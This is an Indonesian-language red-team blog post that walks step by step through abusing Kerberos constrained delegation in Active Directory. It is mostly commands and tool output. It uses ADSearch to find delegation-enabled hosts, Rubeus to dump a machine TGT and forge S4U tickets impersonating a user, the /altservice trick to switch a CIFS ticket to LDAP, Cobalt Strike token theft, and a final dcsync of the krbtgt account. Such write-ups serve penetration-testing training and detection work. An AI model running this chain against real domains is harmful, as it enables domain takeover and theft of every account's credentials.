---
title: '[Kerberos] Constrained Delegation'
date: 2023-08-01 23:19:22 +0700
categories: ['Active Directory', 'Post Compromise Attack']
tags: [red team, active directory hacking, windows hacking, post compromise attack, kerberos]     # TAG names should always be lowercase
author: nairpaa
---

**Constrained Delegation** adalah fitur yang diperkenalkan oleh Windows Server 2003 sebagai upaya untuk membatasi *service* yang dapat bertindak atas nama pengguna lain. 

Dalam konteks ini, sebuah server tidak lagi diizinkan untuk menyimpan *Ticket Granting Ticket* (TGT) pengguna lain, tetapi diperbolehkan untuk meminta *Ticket Granting Service* (TGS) untuk pengguna lain dengan TGT miliknya sendiri.

![Konfigurasi Constrained Delegation](/assets/img/posts/kerberos-constrained-delegation/1.png)
_Konfigurasi Constrained Delegation_

Pada contoh kali ini, `SQL-2` bisa bertindak atas nama pengguna lain terhadap *service* CIFS di `DC-2`. *Service* CIFS (*Common Internet File System*) memiliki banyak kemampuan, seperti menampilkan daftar *file share*, mengunggah dan mengunduh file, bahkan berinteraksi dengan *Service Control Manager*.

## 0x1 - Exploitation Stages

### Method 1: Constrained Delegation Abuse

#### Step 1: Find All Computers Permitted for Constrained Delegation

```powershell
# Mencari komputer dengan atribut `msds-allowedtodelegateto` yang tidak kosong
PS > .\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

[*] TOTAL NUMBER OF SEARCH RESULTS: 1
[
  {
    "dnshostname": "sql-2.dev.example.io",
    "samaccountname": "SQL-2$",
    "msds-allowedtodelegateto": [
      "cifs/dc-2.dev.example.io/dev.example.io",
      "cifs/dc-2.dev.example.io",
      "cifs/DC-2",
      "cifs/dc-2.dev.example.io/DEV",
      "cifs/DC-2/DEV"
    ]
  }
]
```

#### Step 2: Login the Target Machine and Get the TGT

```powershell
# List ticket pada komputer komputer Contrained Delegation (SQL-2)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 --------------------------------------------------------------------------------------------------------------- 
 | LUID    | UserName                    | Service                                       | EndTime              |
 --------------------------------------------------------------------------------------------------------------- 
| 0x3e4    | sql-2$ @ DEV.EXAMPLE.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 9/6/2023 7:06:50 PM |

# Ekstrak TGT
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

    ServiceName              :  krbtgt/DEV.EXAMPLE.IO
    ServiceRealm             :  DEV.EXAMPLE.IO
    UserName                 :  SQL-2$
    UserRealm                :  DEV.EXAMPLE.IO
    StartTime                :  9/6/2022 9:06:50 AM
    EndTime                  :  9/6/2022 7:06:50 PM
    RenewTill                :  9/13/2022 9:06:50 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  pj1tbiijFCGHkM6S58ShgxxPi8FvA1UB5liBqrSWPCg=
    Base64EncodedTicket   :

doIFpD[...]MuSU8=
```

> Kita juga bisa mendapatkannya dengan Rubeus `asktgt` jika memiliki *hash* NTLM atau AES.
{: .prompt-info }

#### Step 3: Perform S4U Request to Get TGS for CIFS

Setelah memiliki TGT, kita dapat melakukan permintaan S4U untuk mendapatkan TGS yang dapat digunakan untuk *service* CIFS. 

Di sini, `/impersonateuser` adalah pengguna yang ingin Anda tiru - mereka seharusnya memiliki akses admin lokal pada mesin target. `/msdsspn` adalah service principal name yang SQL-2 diizinkan untuk mendeleagasikannya. `/user` adalah principal yang diizinkan untuk melakukan delegasi. `/ticket` adalah TGT untuk `/user`.

```powershell
PS > .\Rubeus.exe s4u /impersonateuser:namina /msdsspn:cifs/dc-2.dev.example.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap
```

Keterangan:
- `/impersonateuser`: nama pengguna yang ingin ditiru (harus yang memiliki akses admin lokal pada mesin target).
- `/msdsspn`: SPN yang diizinkan SQL-2 untuk mendeleagasikannya.
- `/user`: *principal* yang diizinkan untuk melakukan delegasi.
- `/ticket`: TGT untuk `/user`.

Perintah di atas akan melakukan S4U2Self terlebih dahulu dan kemudian S4U2Proxy. Tiket S4U2Proxy akhir inilah yang kita butuhkan. 

#### Step 4: Extract the Ticket and Leverage It via a New Logon Session


```powershell
PS > .\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:namina /password:FakePass /ticket:doIGaD[...]ljLmlv

[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : namina
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5540
[+] Ticket successfully imported!
[+] LUID            : 0x3d3194

beacon> steal_token 5540

beacon> ls \\dc-2.dev.example.io\c$
```

### Method 2: Alternate Service Name 

*Service* cifs dapat dimanfaatkan untuk *lateral movement*, tetapi bagaimana jika port 445 tidak tersedia atau kita menginginkan opsi selain PsExec? 

Terdapat cara yang ditemeukan oleh [Alberto Solino](https://twitter.com/agsolino) bahwa nama *service* tidak dilindungi dalam struktur Kerberos, jadi kita bisa meminta TGS untuk *service* apa pun yang dijalankan oleh akun asli.

Hal ini dapat disalahgunakan dengan menggunakan *flag* `/altservice` di Rubeus.  

Dalam contoh ini, kita menggunakan TGT SQL-2 untuk meminta TGS LDAP.

```powershell
PS > .\Rubeus.exe s4u /impersonateuser:namina /msdsspn:cifs/dc-2.dev.example.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap

[*] Action: S4U

[*] Building S4U2self request for: 'SQL-2$@DEV.EXAMPLE.IO'
[*] Using domain controller: dc-2.dev.example.io (10.10.122.10)
[*] Sending S4U2self request to 10.10.122.10:88
[+] S4U2self success!
[*] Got a TGS for 'namina' to 'SQL-2$@DEV.EXAMPLE.IO'
[*] base64(ticket.kirbi):

      doIFnD[...]FMLTIk

[*] Impersonating user 'namina' to target SPN 'cifs/dc-2.dev.example.io'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'cifs/dc-2.dev.example.io'
[*] Using domain controller: dc-2.dev.example.io (10.10.122.10)
[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'ldap'
[*] base64(ticket.kirbi) for SPN 'ldap/dc-2.dev.example.io':

      doIGaD[...]ljLmlv
```

```powershell
PS > .\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:namina /password:FakePass /ticket:doIGaD[...]ljLmlv
	
[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : namina
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2580
[+] Ticket successfully imported!
[+] LUID            : 0x4b328e

   
beacon> steal_token 2580
```

Pada Domain Controller, *service* LDAP memungkinkan kita untuk melakukan [dcsync](/posts/dcsync-attack/).

```powershell
beacon> dcsync dev.example.io DEV\krbtgt
```

---

## 0x2 - References

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation
- https://blog.netwrix.com/2023/04/21/attacking-constrained-delegation-to-elevate-access/
- https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13